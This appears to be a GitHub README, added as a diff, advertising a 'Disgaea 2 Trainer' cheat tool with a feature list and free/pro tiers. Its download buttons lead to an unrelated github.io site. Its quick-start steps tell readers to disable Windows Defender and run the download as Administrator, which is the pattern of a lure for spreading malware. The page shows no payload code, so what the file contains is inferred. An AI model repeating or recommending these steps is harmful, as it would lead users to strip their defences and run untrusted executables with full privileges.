@@ -1,0 +1,93 @@
+<div align="center">
+
+![Disgaea 2 Trainer](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=28&pause=1000&color=E63946&center=true&vCenter=true&width=700&lines=Disgaea%202+Trainer)
+
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+[![Genre](https://img.shields.io/badge/Genre-Strategy%20RPG-green?style=for-the-badge)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+[![Storage](https://img.shields.io/badge/Storage-1GB-orange?style=for-the-badge)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+[![Version](https://img.shields.io/badge/Version-2025-blue?style=for-the-badge)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+[![Stars](https://img.shields.io/github/stars/yrareinihmwt/disgaea-2-trainer?style=for-the-badge&color=gold)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+
+**Disgaea 2: Cursed Memories follows human Adell challenging the Demon Overlord Zenon who turned everyone in his world into demons. Features the Monster Capture and Transform mechanic and some of the most challenging optional maps in the series.**
+
+[![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://spearsurvive.github.io/win/)
+
+![Disgaea 2](game.jpg)
+
+</div>
+
+---
+
+## 📖 About
+
+Disgaea 2: Cursed Memories follows human Adell challenging the Demon Overlord Zenon who turned everyone in his world into demons. Features the Monster Capture and Transform mechanic and some of the most challenging optional maps in the series.
+
+## ⚠️ Problems Without Trainer
+
+| Problem | Status |
+|---------|--------|
+| **Dark Sun Chapter** — Some optional maps are notoriously more difficult than the final boss | ✅ Solved |
+| **Monster Magichange** — Mastering Monster transformation for weapons requires understanding the system | ✅ Solved |
+| **Geo Block Puzzles** — Some Geo Panel maps require very specific destruction sequences | ✅ Solved |
+| **Carnage Dimension** — DLC harder alternate difficulty is extremely punishing | ✅ Solved |
+
+## ✅ Solution
+
+The **Disgaea 2 Trainer** solves all these issues by giving you complete control over the game.
+
+## 🎯 Full Feature List
+
+- Unlimited Resources
+- God Mode / Invincibility
+- Instant Skill Cooldown
+- One-Hit Kill
+- Freeze Game Timer
+- Unlock All Items & Achievements
+- Custom Speed Multiplier
+- Save State Anywhere
+
+## 🚀 Quick Start
+
+1. **Disable Windows Defender** temporarily (trainer may trigger false positive)
+2. Download the trainer from the button above
+3. Launch Disgaea 2
+4. Run the trainer as Administrator
+5. Activate desired cheats with hotkeys
+
+## 💎 Free vs Paid
+
+| Feature | Free | Pro |
+|---------|------|-----|
+| Basic God Mode | ✅ | ✅ |
+| Unlimited Resources | ✅ | ✅ |
+| All Advanced Cheats | ❌ | ✅ |
+| Auto-Updates | ❌ | ✅ |
+| Priority Support | ❌ | ✅ |
+
+## 💻 Requirements
+
+- Windows 10/11 (64-bit)
+- Disgaea 2 (any version)
+- .NET Framework 4.8+
+- DirectX 11+
+
+## 🍎 macOS
+
+macOS users can use our alternative tool:
+
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://spearsurvive.github.io/mac/)
+
+## ⚖️ Legal
+
+This trainer is for educational and single-player use only. Use responsibly.
+
+---
+
+<div align="center">
+
+[![Made with Love](https://img.shields.io/badge/Made_with-❤️-red?style=for-the-badge)](https://github.com/yrareinihmwt/disgaea-2-trainer)
+[![Follow](https://img.shields.io/github/followers/yrareinihmwt?style=for-the-badge&label=Follow)](https://github.com/yrareinihmwt)
+
+</div>
